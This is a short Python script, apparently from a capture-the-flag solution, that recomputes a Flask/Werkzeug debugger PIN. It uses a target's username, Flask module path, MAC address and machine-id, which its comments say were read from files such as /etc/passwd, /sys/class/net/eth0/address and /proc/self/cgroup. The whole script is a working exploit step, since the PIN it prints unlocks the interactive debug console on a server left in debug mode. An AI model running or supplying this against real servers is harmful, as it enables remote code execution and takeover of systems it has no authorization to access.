import hashlib
from itertools import chain
from colorama import Fore, Style

username = "coil" # username, can be found in /etc/passwd (us being given in /whoami)
modname = "flask.app" # modname - i think
appname = "Flask" # getattr(app, '__name__', getattr(app.__class__, '__name__')) - i think
path = "/usr/local/lib/python3.12/site-packages/flask/app.py" # getattr(mod, '__file__', None) - checked

mac = "86:54:8a:cb:40:95" # value from /sys/class/net/<device-id>/address - (value from /sys/class/net/eth0/address)
mch_id = "40a2ccae-0aa4-486d-b68e-6430336da002" # value from /etc/machine-id, or /proc/sys/kernel/random/boot_id + part of /proc/self/cgroup - (value from /proc/self/cgroup)


# Convert MAC address to integer
mac = int("".join(mac.split(":")),16)

probably_public_bits = [username,modname,appname,path]
private_bits = [str(mac), mch_id]

rv = None
num = None
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode("utf-8")
	h.update(bit)
h.update(b"cookiesalt")


if num is None:
	h.update(b"pinsalt")
	num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = "-".join(
				num[x : x + group_size].rjust(group_size, "0")
				for x in range(0, len(num), group_size)
			)
			break
	else:
		rv = num

print(f"[+] Generated PIN: {rv}\n")